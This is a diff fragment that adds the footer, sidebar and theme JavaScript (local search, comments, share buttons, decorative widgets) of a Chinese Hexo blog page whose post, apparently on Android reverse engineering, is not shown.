+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/笔记/" rel="tag"><i class="fa fa-tag"></i> 笔记</a>
+          
+            <a href="/tags/编程/" rel="tag"><i class="fa fa-tag"></i> 编程</a>
+          
+            <a href="/tags/Android/" rel="tag"><i class="fa fa-tag"></i> Android</a>
+          
+            <a href="/tags/逆向/" rel="tag"><i class="fa fa-tag"></i> 逆向</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div class="social_share">
+            
+            
+               <div id="needsharebutton-postbottom">
+                 <span class="btn">
+                    <i class="fa fa-share-alt" aria-hidden="true"></i>
+                 </span>
+               </div>
+            
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/10/大数据学习笔记01-hadoop/" rel="next" title="大数据学习笔记01-hadoop">
+                <i class="fa fa-chevron-left"></i> 大数据学习笔记01-hadoop
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/09/10/JavaSE学习笔记02-网络编程/" rel="prev" title="JavaSE学习笔记02--网络编程">
+                JavaSE学习笔记02--网络编程 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zOTU2NS8xNjA5Mg=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Demo-Mr Wang</p>
+              <p class="site-description motion-element" itemprop="description">Technical exchange</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">36</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">61</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">28</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=310 height=110
+           src="//music.163.com/outchain/player?type=0&id=2059024220&auto=1&height=90"></iframe>
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/prayer007007" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:1264827907@qq.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://blog.csdn.net/u013205428" target="_blank" title="CSDN"><i class="fa fa-fw fa-globe"></i>CSDN</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-globe"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.alloyteam.com/nav/" title="Web前端导航" target="_blank">Web前端导航</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.chuangzaoshi.com/code" title="创造狮导航" target="_blank">创造狮导航</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.36zhen.com/t?id=3448" title="前端书籍资料" target="_blank">前端书籍资料</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://e.xitu.io/" title="掘金酱" target="_blank">掘金酱</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.v2ex.com/" title="V2EX" target="_blank">V2EX</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.v2ex.com/" title="印记中文" target="_blank">印记中文</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+
+  <span class="author" itemprop="copyrightHolder">Demo-Mr Wang</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+    <span title="站点总字数">326k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+    <span title="站点阅读时长">4:56</span>
+  
+
+</div>
+
+
+
+
+
+
+
+
+
+ 
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    
+  
+
+  
+    
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+      <div id="needsharebutton-float">
+        <span class="btn">
+          <i class="fa fa-share-alt" aria-hidden="true"></i>
+        </span>
+      </div>
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.1"></script>
+
+
+
+  
+
+
+
+  
+    <script type="text/javascript">
+      window.livereOptions = {
+        refer: '2018/09/10/android逆向学习笔记01/'
+      };
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+  
+  <script src="/lib/needsharebutton/needsharebutton.js"></script>
+
+  <script>
+    
+      pbOptions = {};
+      
+          pbOptions.iconStyle = "box";
+      
+          pbOptions.boxForm = "horizontal";
+      
+          pbOptions.position = "bottomCenter";
+      
+          pbOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-postbottom', pbOptions);
+    
+    
+      flOptions = {};
+      
+          flOptions.iconStyle = "box";
+      
+          flOptions.boxForm = "horizontal";
+      
+          flOptions.position = "middleRight";
+      
+          flOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-float', flOptions);
+    
+  </script>
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  <!--崩溃欺骗-->
+  <script type="text/javascript" src="/js/src/crash_cheat.js"></script>
+  <!-- 页面点击小红心 -->
+  <script type="text/javascript" src="/js/src/love.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/assets/hijiki.model.json"},"display":{"position":"left","width":150,"height":300},"mobileShow":false,"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
